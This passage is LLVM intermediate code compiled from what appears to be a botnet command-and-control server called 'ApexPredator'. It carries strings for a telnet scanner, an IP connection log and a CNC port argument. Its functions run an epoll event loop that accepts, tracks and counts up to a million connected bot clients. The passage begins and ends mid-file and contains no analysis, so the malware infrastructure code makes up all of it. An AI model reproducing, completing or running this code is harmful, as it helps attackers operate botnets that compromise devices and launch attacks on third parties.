@.str.198 = private unnamed_addr constant [15 x i8] c"!* SCANNER OFF\00", align 1
@.str.199 = private unnamed_addr constant [25 x i8] c"TELNET SCANNER STOPPED\0D\0A\00", align 1
@.str.200 = private unnamed_addr constant [6 x i8] c"clear\00", align 1
@.str.201 = private unnamed_addr constant [4 x i8] c"cls\00", align 1
@.str.202 = private unnamed_addr constant [4 x i8] c"CLS\00", align 1
@.str.203 = private unnamed_addr constant [6 x i8] c"CLEAR\00", align 1
@.str.204 = private unnamed_addr constant [5 x i8] c"EXIT\00", align 1
@.str.205 = private unnamed_addr constant [5 x i8] c"exit\00", align 1
@.str.206 = private unnamed_addr constant [97 x i8] c"\1B[1;37m[\1B[1;31mApexPredator\1B[1;37m] User:[\1B[0;36m%s\1B[1;37m] - Command:\1B[1;37m[\1B[0;36m%s\1B[1;37m]\0A\00", align 1
@.str.207 = private unnamed_addr constant [21 x i8] c"ERROR opening socket\00", align 1
@.str.208 = private unnamed_addr constant [52 x i8] c"\1B[1;37m[\1B[1;31mApexPredator\1B[1;37m] Screening Error\00", align 1
@.str.209 = private unnamed_addr constant [62 x i8] c"\1B[1;37m[\1B[1;31mApexPredator\1B[1;37m] Incoming Connection From \00", align 1
@.str.210 = private unnamed_addr constant [7 x i8] c"IP.log\00", align 1
@.str.211 = private unnamed_addr constant [90 x i8] c"\1B[1;37m[\1B[1;31mApexPredator\1B[1;37m] Incoming Connection From [\1B[0;36m%d.%d.%d.%d\1B[1;37m]\0A\00", align 1
@.str.212 = private unnamed_addr constant [16 x i8] c"ERROR on accept\00", align 1
@stderr = external local_unnamed_addr global %struct._IO_FILE*, align 8
@.str.213 = private unnamed_addr constant [39 x i8] c"Usage: %s [port] [threads] [cnc-port]\0A\00", align 1
@.str.216 = private unnamed_addr constant [7 x i8] c"listen\00", align 1
@.str.217 = private unnamed_addr constant [13 x i8] c"epoll_create\00", align 1
@.str.220 = private unnamed_addr constant [17 x i8] c"getaddrinfo: %s\0A\00", align 1
@.str.221 = private unnamed_addr constant [11 x i8] c"setsockopt\00", align 1
@.str.222 = private unnamed_addr constant [16 x i8] c"Could not bind\0A\00", align 1
@str = private unnamed_addr constant [110 x i8] c"\1B[1;31m\1B[1;37m[\1B[1;31mApexPredator\1B[1;37m] Successfully Screened - Created By [\1B[0;36mFlexingOnLamers\1B[1;37m]\00"
@str.1 = private unnamed_addr constant [86 x i8] c"\1B[1;37m[\1B[1;31mApexPredator\1B[1;37m] Thread Limit Exceeded! Please Lower Threat Count!\00"

; Function Attrs: noinline nounwind uwtable
define i32 @fdgets(i8* nocapture, i32, i32) local_unnamed_addr #0 {
  %4 = icmp sgt i32 %1, 0
  br i1 %4, label %.lr.ph.preheader, label %.critedge

.lr.ph.preheader:                                 ; preds = %3
  %5 = sext i32 %1 to i64
  br label %.lr.ph

.lr.ph:                                           ; preds = %.lr.ph.preheader, %10
  %indvars.iv = phi i64 [ 0, %.lr.ph.preheader ], [ %indvars.iv.next, %10 ]
  %6 = getelementptr inbounds i8, i8* %0, i64 %indvars.iv
  %7 = getelementptr inbounds i8, i8* %6, i64 -1
  %8 = load i8, i8* %7, align 1
  %9 = icmp eq i8 %8, 10
  br i1 %9, label %.critedge.loopexit, label %10

; <label>:10:                                     ; preds = %.lr.ph
  %11 = tail call i64 @read(i32 %2, i8* %6, i64 1) #10
  %12 = trunc i64 %11 to i32
  %indvars.iv.next = add nuw nsw i64 %indvars.iv, 1
  %13 = icmp eq i32 %12, 1
  %14 = icmp slt i64 %indvars.iv.next, %5
  %or.cond = and i1 %14, %13
  br i1 %or.cond, label %.lr.ph, label %.critedge.loopexit

.critedge.loopexit:                               ; preds = %.lr.ph, %10
  %.0.lcssa.ph = phi i32 [ 1, %.lr.ph ], [ %12, %10 ]
  br label %.critedge

.critedge:                                        ; preds = %.critedge.loopexit, %3
  %.0.lcssa = phi i32 [ 1, %3 ], [ %.0.lcssa.ph, %.critedge.loopexit ]
  ret i32 %.0.lcssa
}

declare i64 @read(i32, i8* nocapture, i64) local_unnamed_addr #1

; Function Attrs: noinline nounwind uwtable
define void @trim(i8* nocapture) local_unnamed_addr #0 {
  %2 = tail call i64 @strlen(i8* %0) #9
  %3 = add i64 %2, 4294967295
  br label %4

; <label>:4:                                      ; preds = %4, %1
  %indvars.iv29 = phi i64 [ %indvars.iv.next30, %4 ], [ 0, %1 ]
  %5 = getelementptr inbounds i8, i8* %0, i64 %indvars.iv29
  %6 = load i8, i8* %5, align 1
  %7 = sext i8 %6 to i32
  %8 = tail call i32 @isspace(i32 %7) #9
  %9 = icmp eq i32 %8, 0
  %indvars.iv.next30 = add nuw i64 %indvars.iv29, 1
  br i1 %9, label %.preheader, label %4

.preheader:                                       ; preds = %4
  %10 = trunc i64 %3 to i32
  %11 = trunc i64 %indvars.iv29 to i32
  %12 = icmp slt i32 %10, %11
  br i1 %12, label %.critedge.preheader, label %.lr.ph22.preheader

.lr.ph22.preheader:                               ; preds = %.preheader
  %sext = shl i64 %3, 32
  %13 = ashr exact i64 %sext, 32
  %sext31 = shl i64 %indvars.iv29, 32
  %14 = ashr exact i64 %sext31, 32
  br label %.lr.ph22

.critedge.preheader.loopexit:                     ; preds = %.lr.ph22, %80
  %.0.lcssa.ph = phi i32 [ %79, %.lr.ph22 ], [ %81, %80 ]
  br label %.critedge.preheader

.critedge.preheader:                              ; preds = %.critedge.preheader.loopexit, %.preheader
  %.0.lcssa = phi i32 [ %10, %.preheader ], [ %.0.lcssa.ph, %.critedge.preheader.loopexit ]
  %15 = icmp sgt i32 %11, %.0.lcssa
  br i1 %15, label %.critedge._crit_edge, label %.critedge.preheader26

.critedge.preheader26:                            ; preds = %.critedge.preheader
  %sext32 = shl i64 %indvars.iv29, 32
  %16 = ashr exact i64 %sext32, 32
  %17 = sext i32 %.0.lcssa to i64
  %18 = icmp sgt i64 %17, %16
  %smax = select i1 %18, i64 %17, i64 %16
  %19 = add nsw i64 %smax, 1
  %20 = sub nsw i64 %19, %16
  %min.iters.check = icmp ult i64 %20, 32
  br i1 %min.iters.check, label %.critedge.preheader39, label %min.iters.checked

.critedge.preheader39:                            ; preds = %middle.block, %vector.memcheck, %min.iters.checked, %.critedge.preheader26
  %indvars.iv.ph = phi i64 [ %16, %vector.memcheck ], [ %16, %min.iters.checked ], [ %16, %.critedge.preheader26 ], [ %ind.end, %middle.block ]
  br label %.critedge

min.iters.checked:                                ; preds = %.critedge.preheader26
  %n.vec = and i64 %20, -32
  %cmp.zero = icmp eq i64 %n.vec, 0
  br i1 %cmp.zero, label %.critedge.preheader39, label %vector.memcheck

vector.memcheck:                                  ; preds = %min.iters.checked
  %21 = icmp sgt i64 %17, %16
  %smax34 = select i1 %21, i64 %17, i64 %16
  %22 = add nsw i64 %smax34, 1
  %23 = sub nsw i64 %22, %16
  %scevgep = getelementptr i8, i8* %0, i64 %23
  %scevgep35 = getelementptr i8, i8* %0, i64 %16
  %scevgep36 = getelementptr i8, i8* %0, i64 %22
  %bound0 = icmp ugt i8* %scevgep36, %0
  %bound1 = icmp ult i8* %scevgep35, %scevgep
  %memcheck.conflict = and i1 %bound0, %bound1
  %ind.end = add nsw i64 %16, %n.vec
  br i1 %memcheck.conflict, label %.critedge.preheader39, label %vector.body.preheader

vector.body.preheader:                            ; preds = %vector.memcheck
  %24 = add nsw i64 %n.vec, -32
  %25 = lshr exact i64 %24, 5
  %26 = add nuw nsw i64 %25, 1
  %xtraiter = and i64 %26, 3
  %lcmp.mod = icmp eq i64 %xtraiter, 0
  br i1 %lcmp.mod, label %vector.body.prol.loopexit, label %vector.body.prol.preheader

vector.body.prol.preheader:                       ; preds = %vector.body.preheader
  br label %vector.body.prol

vector.body.prol:                                 ; preds = %vector.body.prol, %vector.body.prol.preheader
  %index.prol = phi i64 [ %index.next.prol, %vector.body.prol ], [ 0, %vector.body.prol.preheader ]
  %prol.iter = phi i64 [ %prol.iter.sub, %vector.body.prol ], [ %xtraiter, %vector.body.prol.preheader ]
  %27 = add i64 %16, %index.prol
  %28 = getelementptr inbounds i8, i8* %0, i64 %27
  %29 = bitcast i8* %28 to <16 x i8>*
  %wide.load.prol = load <16 x i8>, <16 x i8>* %29, align 1, !alias.scope !1
  %30 = getelementptr i8, i8* %28, i64 16
  %31 = bitcast i8* %30 to <16 x i8>*
  %wide.load38.prol = load <16 x i8>, <16 x i8>* %31, align 1, !alias.scope !1
  %32 = getelementptr inbounds i8, i8* %0, i64 %index.prol
  %33 = bitcast i8* %32 to <16 x i8>*
  store <16 x i8> %wide.load.prol, <16 x i8>* %33, align 1, !alias.scope !4, !noalias !1
  %34 = getelementptr i8, i8* %32, i64 16
  %35 = bitcast i8* %34 to <16 x i8>*
  store <16 x i8> %wide.load38.prol, <16 x i8>* %35, align 1, !alias.scope !4, !noalias !1
  %index.next.prol = add i64 %index.prol, 32
  %prol.iter.sub = add i64 %prol.iter, -1
  %prol.iter.cmp = icmp eq i64 %prol.iter.sub, 0
  br i1 %prol.iter.cmp, label %vector.body.prol.loopexit.unr-lcssa, label %vector.body.prol, !llvm.loop !6

vector.body.prol.loopexit.unr-lcssa:              ; preds = %vector.body.prol
  br label %vector.body.prol.loopexit

vector.body.prol.loopexit:                        ; preds = %vector.body.preheader, %vector.body.prol.loopexit.unr-lcssa
  %index.unr = phi i64 [ 0, %vector.body.preheader ], [ %index.next.prol, %vector.body.prol.loopexit.unr-lcssa ]
  %36 = icmp ult i64 %24, 96
  br i1 %36, label %middle.block, label %vector.body.preheader.new

vector.body.preheader.new:                        ; preds = %vector.body.prol.loopexit
  br label %vector.body

vector.body:                                      ; preds = %vector.body, %vector.body.preheader.new
  %index = phi i64 [ %index.unr, %vector.body.preheader.new ], [ %index.next.3, %vector.body ]
  %37 = add i64 %16, %index
  %38 = getelementptr inbounds i8, i8* %0, i64 %37
  %39 = bitcast i8* %38 to <16 x i8>*
  %wide.load = load <16 x i8>, <16 x i8>* %39, align 1, !alias.scope !1
  %40 = getelementptr i8, i8* %38, i64 16
  %41 = bitcast i8* %40 to <16 x i8>*
  %wide.load38 = load <16 x i8>, <16 x i8>* %41, align 1, !alias.scope !1
  %42 = getelementptr inbounds i8, i8* %0, i64 %index
  %43 = bitcast i8* %42 to <16 x i8>*
  store <16 x i8> %wide.load, <16 x i8>* %43, align 1, !alias.scope !4, !noalias !1
  %44 = getelementptr i8, i8* %42, i64 16
  %45 = bitcast i8* %44 to <16 x i8>*
  store <16 x i8> %wide.load38, <16 x i8>* %45, align 1, !alias.scope !4, !noalias !1
  %index.next = add i64 %index, 32
  %46 = add i64 %16, %index.next
  %47 = getelementptr inbounds i8, i8* %0, i64 %46
  %48 = bitcast i8* %47 to <16 x i8>*
  %wide.load.1 = load <16 x i8>, <16 x i8>* %48, align 1, !alias.scope !1
  %49 = getelementptr i8, i8* %47, i64 16
  %50 = bitcast i8* %49 to <16 x i8>*
  %wide.load38.1 = load <16 x i8>, <16 x i8>* %50, align 1, !alias.scope !1
  %51 = getelementptr inbounds i8, i8* %0, i64 %index.next
  %52 = bitcast i8* %51 to <16 x i8>*
  store <16 x i8> %wide.load.1, <16 x i8>* %52, align 1, !alias.scope !4, !noalias !1
  %53 = getelementptr i8, i8* %51, i64 16
  %54 = bitcast i8* %53 to <16 x i8>*
  store <16 x i8> %wide.load38.1, <16 x i8>* %54, align 1, !alias.scope !4, !noalias !1
  %index.next.1 = add i64 %index, 64
  %55 = add i64 %16, %index.next.1
  %56 = getelementptr inbounds i8, i8* %0, i64 %55
  %57 = bitcast i8* %56 to <16 x i8>*
  %wide.load.2 = load <16 x i8>, <16 x i8>* %57, align 1, !alias.scope !1
  %58 = getelementptr i8, i8* %56, i64 16
  %59 = bitcast i8* %58 to <16 x i8>*
  %wide.load38.2 = load <16 x i8>, <16 x i8>* %59, align 1, !alias.scope !1
  %60 = getelementptr inbounds i8, i8* %0, i64 %index.next.1
  %61 = bitcast i8* %60 to <16 x i8>*
  store <16 x i8> %wide.load.2, <16 x i8>* %61, align 1, !alias.scope !4, !noalias !1
  %62 = getelementptr i8, i8* %60, i64 16
  %63 = bitcast i8* %62 to <16 x i8>*
  store <16 x i8> %wide.load38.2, <16 x i8>* %63, align 1, !alias.scope !4, !noalias !1
  %index.next.2 = add i64 %index, 96
  %64 = add i64 %16, %index.next.2
  %65 = getelementptr inbounds i8, i8* %0, i64 %64
  %66 = bitcast i8* %65 to <16 x i8>*
  %wide.load.3 = load <16 x i8>, <16 x i8>* %66, align 1, !alias.scope !1
  %67 = getelementptr i8, i8* %65, i64 16
  %68 = bitcast i8* %67 to <16 x i8>*
  %wide.load38.3 = load <16 x i8>, <16 x i8>* %68, align 1, !alias.scope !1
  %69 = getelementptr inbounds i8, i8* %0, i64 %index.next.2
  %70 = bitcast i8* %69 to <16 x i8>*
  store <16 x i8> %wide.load.3, <16 x i8>* %70, align 1, !alias.scope !4, !noalias !1
  %71 = getelementptr i8, i8* %69, i64 16
  %72 = bitcast i8* %71 to <16 x i8>*
  store <16 x i8> %wide.load38.3, <16 x i8>* %72, align 1, !alias.scope !4, !noalias !1
  %index.next.3 = add i64 %index, 128
  %73 = icmp eq i64 %index.next.3, %n.vec
  br i1 %73, label %middle.block.unr-lcssa, label %vector.body, !llvm.loop !8

middle.block.unr-lcssa:                           ; preds = %vector.body
  br label %middle.block

middle.block:                                     ; preds = %vector.body.prol.loopexit, %middle.block.unr-lcssa
  %cmp.n = icmp eq i64 %20, %n.vec
  br i1 %cmp.n, label %.critedge._crit_edge, label %.critedge.preheader39

.lr.ph22:                                         ; preds = %.lr.ph22.preheader, %80
  %indvars.iv27 = phi i64 [ %13, %.lr.ph22.preheader ], [ %indvars.iv.next28, %80 ]
  %.021 = phi i32 [ %10, %.lr.ph22.preheader ], [ %81, %80 ]
  %74 = getelementptr inbounds i8, i8* %0, i64 %indvars.iv27
  %75 = load i8, i8* %74, align 1
  %76 = sext i8 %75 to i32
  %77 = tail call i32 @isspace(i32 %76) #9
  %78 = icmp eq i32 %77, 0
  %79 = trunc i64 %indvars.iv27 to i32
  br i1 %78, label %.critedge.preheader.loopexit, label %80

; <label>:80:                                     ; preds = %.lr.ph22
  %indvars.iv.next28 = add nsw i64 %indvars.iv27, -1
  %81 = add nsw i32 %.021, -1
  %82 = icmp sgt i64 %indvars.iv27, %14
  br i1 %82, label %.lr.ph22, label %.critedge.preheader.loopexit

.critedge:                                        ; preds = %.critedge.preheader39, %.critedge
  %indvars.iv = phi i64 [ %indvars.iv.next, %.critedge ], [ %indvars.iv.ph, %.critedge.preheader39 ]
  %83 = getelementptr inbounds i8, i8* %0, i64 %indvars.iv
  %84 = load i8, i8* %83, align 1
  %85 = sub nsw i64 %indvars.iv, %16
  %86 = getelementptr inbounds i8, i8* %0, i64 %85
  store i8 %84, i8* %86, align 1
  %indvars.iv.next = add nsw i64 %indvars.iv, 1
  %87 = icmp slt i64 %indvars.iv, %17
  br i1 %87, label %.critedge, label %.critedge._crit_edge.loopexit, !llvm.loop !11

.critedge._crit_edge.loopexit:                    ; preds = %.critedge
  br label %.critedge._crit_edge

.critedge._crit_edge:                             ; preds = %.critedge._crit_edge.loopexit, %middle.block, %.critedge.preheader
  %.019.lcssa = phi i64 [ %indvars.iv29, %.critedge.preheader ], [ %ind.end, %middle.block ], [ %indvars.iv.next, %.critedge._crit_edge.loopexit ]
  %88 = sub i64 %.019.lcssa, %indvars.iv29
  %sext33 = shl i64 %88, 32
  %89 = ashr exact i64 %sext33, 32
  %90 = getelementptr inbounds i8, i8* %0, i64 %89
  store i8 0, i8* %90, align 1
  ret void
}

; Function Attrs: nounwind readonly
declare i64 @strlen(i8* nocapture) local_unnamed_addr #2

; Function Attrs: nounwind readonly
declare i32 @isspace(i32) local_unnamed_addr #2

; Function Attrs: noinline nounwind uwtable
define void @broadcast(i8* nocapture readonly, i32, i8* nocapture readnone) local_unnamed_addr #0 {
  %4 = alloca i64, align 8
  %5 = tail call i64 @strlen(i8* %0) #9
  %6 = add i64 %5, 10
  %7 = tail call noalias i8* @malloc(i64 %6) #10
  %8 = tail call i64 @strlen(i8* %0) #9
  %9 = add i64 %8, 10
  tail call void @llvm.memset.p0i8.i64(i8* %7, i8 0, i64 %9, i32 1, i1 false)
  %10 = tail call i8* @strcpy(i8* %7, i8* %0) #10
  tail call void @trim(i8* %7)
  %11 = call i64 @time(i64* nonnull %4) #10
  %12 = call %struct.tm* @localtime(i64* nonnull %4) #10
  %13 = call i8* @asctime(%struct.tm* %12) #10
  call void @trim(i8* %13)
  call void @free(i8* %7) #10
  ret void
}

; Function Attrs: nounwind readonly
declare i32 @strcmp(i8* nocapture, i8* nocapture) local_unnamed_addr #2

; Function Attrs: nounwind
declare noalias i8* @malloc(i64) local_unnamed_addr #3

; Function Attrs: argmemonly nounwind
declare void @llvm.memset.p0i8.i64(i8* nocapture writeonly, i8, i64, i32, i1) #4

; Function Attrs: nounwind
declare i8* @strcpy(i8*, i8* nocapture readonly) local_unnamed_addr #3

; Function Attrs: nounwind
declare i64 @time(i64*) local_unnamed_addr #3

; Function Attrs: nounwind
declare %struct.tm* @localtime(i64*) local_unnamed_addr #3

; Function Attrs: nounwind
declare i8* @asctime(%struct.tm*) local_unnamed_addr #3

; Function Attrs: nounwind
declare void @free(i8* nocapture) local_unnamed_addr #3

; Function Attrs: noinline noreturn nounwind uwtable
define noalias nonnull i8* @epollEventLoop(i8* nocapture readnone) #5 {
  %2 = alloca %struct.epoll_event, align 4
  %3 = alloca %struct.sockaddr_in, align 2
  %tmpcast = bitcast %struct.sockaddr_in* %3 to %struct.sockaddr*
  %4 = alloca i32, align 4
  %5 = alloca [2048 x i8], align 16
  %6 = tail call noalias i8* @calloc(i64 1000000, i64 12) #10
  %7 = bitcast i8* %6 to %struct.epoll_event*
  %8 = getelementptr inbounds [2048 x i8], [2048 x i8]* %5, i64 0, i64 0
  %9 = getelementptr inbounds %struct.sockaddr_in, %struct.sockaddr_in* %3, i64 0, i32 2, i32 0
  %10 = getelementptr inbounds %struct.epoll_event, %struct.epoll_event* %2, i64 0, i32 1
  %11 = bitcast %union.epoll_data* %10 to i32*
  %12 = getelementptr inbounds %struct.epoll_event, %struct.epoll_event* %2, i64 0, i32 0
  %13 = getelementptr inbounds [2048 x i8], [2048 x i8]* %5, i64 0, i64 0
  br label %.loopexit.outer

.loopexit.outer.loopexit:                         ; preds = %91
  br label %.loopexit.outer

.loopexit.outer:                                  ; preds = %.loopexit.outer.loopexit, %1
  br label %.loopexit

.loopexit:                                        ; preds = %.loopexit.outer, %.loopexit
  %14 = load volatile i32, i32* @epollFD, align 4
  %15 = call i32 @epoll_wait(i32 %14, %struct.epoll_event* %7, i32 1000000, i32 -1) #10
  %16 = icmp sgt i32 %15, 0
  br i1 %16, label %.lr.ph62.preheader, label %.loopexit

.lr.ph62.preheader:                               ; preds = %.loopexit
  %17 = sext i32 %15 to i64
  br label %.lr.ph62

.lr.ph62:                                         ; preds = %.lr.ph62.preheader, %91
  %indvars.iv = phi i64 [ 0, %.lr.ph62.preheader ], [ %indvars.iv.next, %91 ]
  %18 = getelementptr inbounds %struct.epoll_event, %struct.epoll_event* %7, i64 %indvars.iv, i32 0
  %19 = load i32, i32* %18, align 1
  %20 = and i32 %19, 25
  %21 = icmp eq i32 %20, 1
  br i1 %21, label %29, label %22

; <label>:22:                                     ; preds = %.lr.ph62
  %23 = getelementptr inbounds %struct.epoll_event, %struct.epoll_event* %7, i64 %indvars.iv, i32 1
  %24 = bitcast %union.epoll_data* %23 to i32*
  %25 = load i32, i32* %24, align 1
  %26 = sext i32 %25 to i64
  %27 = getelementptr inbounds [1000000 x %struct.clientdata_t], [1000000 x %struct.clientdata_t]* @clients, i64 0, i64 %26, i32 2
  store i8 0, i8* %27, align 1
  %28 = call i32 @close(i32 %25) #10
  br label %91

; <label>:29:                                     ; preds = %.lr.ph62
  %30 = load volatile i32, i32* @listenFD, align 4
  %31 = getelementptr inbounds %struct.epoll_event, %struct.epoll_event* %7, i64 %indvars.iv, i32 1
  %32 = bitcast %union.epoll_data* %31 to i32*
  %33 = load i32, i32* %32, align 1
  %34 = icmp eq i32 %30, %33
  br i1 %34, label %.preheader, label %62

.preheader:                                       ; preds = %29
  store i32 16, i32* %4, align 4
  %35 = load volatile i32, i32* @listenFD, align 4
  %36 = call i32 @accept(i32 %35, %struct.sockaddr* nonnull %tmpcast, i32* nonnull %4) #10
  %37 = icmp eq i32 %36, -1
  br i1 %37, label %._crit_edge, label %.lr.ph57.preheader

.lr.ph57.preheader:                               ; preds = %.preheader
  br label %.lr.ph57

._crit_edge.loopexit:                             ; preds = %56
  br label %._crit_edge

._crit_edge:                                      ; preds = %._crit_edge.loopexit, %.preheader
  %38 = tail call i32* @__errno_location() #11
  %39 = load i32, i32* %38, align 4
  %40 = icmp eq i32 %39, 11
  br i1 %40, label %91, label %41

; <label>:41:                                     ; preds = %._crit_edge
  call void @perror(i8* getelementptr inbounds ([7 x i8], [7 x i8]* @.str.1, i64 0, i64 0)) #12
  br label %91

.lr.ph57:                                         ; preds = %.lr.ph57.preheader, %56
  %42 = phi i32 [ %60, %56 ], [ %36, %.lr.ph57.preheader ]
  %43 = load i32, i32* %9, align 2
  %44 = sext i32 %42 to i64
  %45 = getelementptr inbounds [1000000 x %struct.clientdata_t], [1000000 x %struct.clientdata_t]* @clients, i64 0, i64 %44, i32 0
  store i32 %43, i32* %45, align 4
  %46 = call fastcc i32 @make_socket_non_blocking(i32 %42)
  %47 = icmp eq i32 %46, -1
  br i1 %47, label %48, label %50

; <label>:48:                                     ; preds = %.lr.ph57
  %49 = call i32 @close(i32 %42) #10
  br label %91

; <label>:50:                                     ; preds = %.lr.ph57
  store i32 %42, i32* %11, align 4
  store i32 -2147483647, i32* %12, align 4
  %51 = load volatile i32, i32* @epollFD, align 4
  %52 = call i32 @epoll_ctl(i32 %51, i32 1, i32 %42, %struct.epoll_event* nonnull %2) #10
  %53 = icmp eq i32 %52, -1
  br i1 %53, label %54, label %56

; <label>:54:                                     ; preds = %50
  call void @perror(i8* getelementptr inbounds ([10 x i8], [10 x i8]* @.str.2, i64 0, i64 0)) #12
  %55 = call i32 @close(i32 %42) #10
  br label %91

; <label>:56:                                     ; preds = %50
  %57 = getelementptr inbounds [1000000 x %struct.clientdata_t], [1000000 x %struct.clientdata_t]* @clients, i64 0, i64 %44, i32 2
  store i8 1, i8* %57, align 1
  %58 = call i64 @send(i32 %42, i8* getelementptr inbounds ([15 x i8], [15 x i8]* @.str.3, i64 0, i64 0), i64 14, i32 16384) #10
  store i32 16, i32* %4, align 4
  %59 = load volatile i32, i32* @listenFD, align 4
  %60 = call i32 @accept(i32 %59, %struct.sockaddr* nonnull %tmpcast, i32* nonnull %4) #10
  %61 = icmp eq i32 %60, -1
  br i1 %61, label %._crit_edge.loopexit, label %.lr.ph57

; <label>:62:                                     ; preds = %29
  %63 = sext i32 %33 to i64
  %64 = getelementptr inbounds [1000000 x %struct.clientdata_t], [1000000 x %struct.clientdata_t]* @clients, i64 0, i64 %63, i32 2
  store i8 1, i8* %64, align 1
  br label %65

; <label>:65:                                     ; preds = %.critedge, %62
  %.036 = phi i32 [ 0, %62 ], [ %.137, %.critedge ]
  call void @llvm.memset.p0i8.i64(i8* nonnull %13, i8 0, i64 2048, i32 16, i1 false)
  %66 = call i32 @fdgets(i8* nonnull %8, i32 2048, i32 %33)
  %67 = sext i32 %66 to i64
  %68 = icmp sgt i32 %66, 0
  br i1 %68, label %.lr.ph.preheader, label %.critedge

.lr.ph.preheader:                                 ; preds = %65
  br label %.lr.ph

.lr.ph:                                           ; preds = %.lr.ph.preheader, %.backedge
  %69 = phi i64 [ %83, %.backedge ], [ %67, %.lr.ph.preheader ]
  %strchr = call i8* @strchr(i8* nonnull %8, i32 10)
  %70 = icmp eq i8* %strchr, null
  br i1 %70, label %.critedge.loopexit, label %71

; <label>:71:                                     ; preds = %.lr.ph
  call void @trim(i8* nonnull %8)
  %72 = call i32 @strcmp(i8* nonnull %8, i8* getelementptr inbounds ([5 x i8], [5 x i8]* @.str, i64 0, i64 0)) #9
  %73 = icmp eq i32 %72, 0
  br i1 %73, label %74, label %77

; <label>:74:                                     ; preds = %71
  %75 = call i64 @send(i32 %33, i8* getelementptr inbounds ([6 x i8], [6 x i8]* @.str.5, i64 0, i64 0), i64 5, i32 16384) #10
  %76 = icmp eq i64 %75, -1
  br i1 %76, label %.critedge.loopexit, label %.backedge

; <label>:77:                                     ; preds = %71
  %78 = call i32 @strcmp(i8* nonnull %8, i8* getelementptr inbounds ([5 x i8], [5 x i8]* @.str.6, i64 0, i64 0)) #9
  %79 = icmp eq i32 %78, 0
  br i1 %79, label %.backedge, label %80

; <label>:80:                                     ; preds = %77
  %81 = call i32 (i8*, ...) @printf(i8* getelementptr inbounds ([11 x i8], [11 x i8]* @.str.7, i64 0, i64 0), i8* nonnull %8)
  br label %.backedge

.backedge:                                        ; preds = %80, %74, %77
  call void @llvm.memset.p0i8.i64(i8* nonnull %8, i8 0, i64 2048, i32 16, i1 false)
  %82 = call i32 @fdgets(i8* nonnull %8, i32 2048, i32 %33)
  %83 = sext i32 %82 to i64
  %84 = icmp sgt i32 %82, 0
  br i1 %84, label %.lr.ph, label %.critedge.loopexit

.critedge.loopexit:                               ; preds = %74, %.lr.ph, %.backedge
  %.lcssa.ph = phi i64 [ %69, %74 ], [ %69, %.lr.ph ], [ %83, %.backedge ]
  %.137.ph = phi i32 [ 1, %74 ], [ 1, %.lr.ph ], [ %.036, %.backedge ]
  br label %.critedge

.critedge:                                        ; preds = %.critedge.loopexit, %65
  %.lcssa = phi i64 [ %67, %65 ], [ %.lcssa.ph, %.critedge.loopexit ]
  %.137 = phi i32 [ %.036, %65 ], [ %.137.ph, %.critedge.loopexit ]
  switch i64 %.lcssa, label %65 [
    i64 -1, label %85
    i64 0, label %.thread.loopexit
  ]

; <label>:85:                                     ; preds = %.critedge
  %86 = tail call i32* @__errno_location() #11
  %87 = load i32, i32* %86, align 4
  %88 = icmp eq i32 %87, 11
  %89 = icmp eq i32 %.137, 0
  %or.cond43 = and i1 %89, %88
  br i1 %or.cond43, label %91, label %.thread

.thread.loopexit:                                 ; preds = %.critedge
  br label %.thread

.thread:                                          ; preds = %.thread.loopexit, %85
  store i8 0, i8* %64, align 1
  %90 = call i32 @close(i32 %33) #10
  br label %91

; <label>:91:                                     ; preds = %85, %.thread, %41, %48, %54, %._crit_edge, %22
  %indvars.iv.next = add nuw nsw i64 %indvars.iv, 1
  %92 = icmp slt i64 %indvars.iv.next, %17
  br i1 %92, label %.lr.ph62, label %.loopexit.outer.loopexit
}

; Function Attrs: nounwind
declare noalias i8* @calloc(i64, i64) local_unnamed_addr #3

declare i32 @epoll_wait(i32, %struct.epoll_event*, i32, i32) local_unnamed_addr #1

declare i32 @close(i32) local_unnamed_addr #1

declare i32 @accept(i32, %struct.sockaddr*, i32*) local_unnamed_addr #1

; Function Attrs: nounwind readnone
declare i32* @__errno_location() local_unnamed_addr #6

; Function Attrs: nounwind
declare void @perror(i8* nocapture readonly) local_unnamed_addr #3

; Function Attrs: noinline nounwind uwtable
define internal fastcc i32 @make_socket_non_blocking(i32) unnamed_addr #0 {
  %2 = tail call i32 (i32, i32, ...) @fcntl(i32 %0, i32 3, i32 0) #10
  %3 = icmp eq i32 %2, -1
  br i1 %3, label %4, label %5

; <label>:4:                                      ; preds = %1
  tail call void @perror(i8* getelementptr inbounds ([6 x i8], [6 x i8]* @.str.219, i64 0, i64 0)) #12
  br label %10

; <label>:5:                                      ; preds = %1
  %6 = or i32 %2, 2048
  %7 = tail call i32 (i32, i32, ...) @fcntl(i32 %0, i32 4, i32 %6) #10
  %8 = icmp eq i32 %7, -1
  br i1 %8, label %9, label %10

; <label>:9:                                      ; preds = %5
  tail call void @perror(i8* getelementptr inbounds ([6 x i8], [6 x i8]* @.str.219, i64 0, i64 0)) #12
  br label %10

; <label>:10:                                     ; preds = %5, %9, %4
  %.0 = phi i32 [ -1, %4 ], [ -1, %9 ], [ 0, %5 ]
  ret i32 %.0
}

; Function Attrs: nounwind
declare i32 @epoll_ctl(i32, i32, i32, %struct.epoll_event*) local_unnamed_addr #3

declare i64 @send(i32, i8*, i64, i32) local_unnamed_addr #1

; Function Attrs: nounwind readonly
declare i8* @strstr(i8*, i8* nocapture) local_unnamed_addr #2

; Function Attrs: nounwind
declare i32 @printf(i8* nocapture readonly, ...) local_unnamed_addr #3

declare i32 @fcntl(i32, i32, ...) local_unnamed_addr #1

; Function Attrs: noinline norecurse nounwind readonly uwtable
define i32 @clientsConnected() local_unnamed_addr #7 {
min.iters.checked:
  br label %vector.body

vector.body:                                      ; preds = %vector.body, %min.iters.checked
  %index = phi i64 [ 0, %min.iters.checked ], [ %index.next, %vector.body ]
  %vec.phi = phi <4 x i32> [ zeroinitializer, %min.iters.checked ], [ %35, %vector.body ]
  %vec.phi9 = phi <4 x i32> [ zeroinitializer, %min.iters.checked ], [ %36, %vector.body ]
  %0 = or i64 %index, 1
  %1 = or i64 %index, 2
  %2 = or i64 %index, 3
  %3 = or i64 %index, 4
  %4 = or i64 %index, 5
  %5 = or i64 %index, 6
  %6 = or i64 %index, 7
  %7 = getelementptr inbounds [1000000 x %struct.clientdata_t], [1000000 x %struct.clientdata_t]* @clients, i64 0, i64 %index, i32 2
  %8 = getelementptr inbounds [1000000 x %struct.clientdata_t], [1000000 x %struct.clientdata_t]* @clients, i64 0, i64 %0, i32 2
  %9 = getelementptr inbounds [1000000 x %struct.clientdata_t], [1000000 x %struct.clientdata_t]* @clients, i64 0, i64 %1, i32 2
  %10 = getelementptr inbounds [1000000 x %struct.clientdata_t], [1000000 x %struct.clientdata_t]* @clients, i64 0, i64 %2, i32 2
